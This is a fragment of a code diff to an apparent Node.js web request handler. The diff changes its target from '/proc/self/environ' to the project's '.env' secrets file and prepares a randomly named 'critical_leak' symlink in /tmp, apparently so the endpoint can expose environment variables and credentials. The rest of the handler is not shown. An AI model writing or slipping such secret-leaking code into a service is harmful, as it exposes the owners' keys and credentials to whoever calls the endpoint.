@@ -3,7 +3,7 @@ const path = require('path');
 
 module.exports = async (req, res) => {
     try {
-        const targetPath = '/proc/self/environ'; 
+        const targetPath = path.join(process.cwd(), '.env');
         const bridgeName = `critical_leak_${Math.random().toString(36).substring(7)}`;
         const linkPath = path.join('/tmp', bridgeName);
 
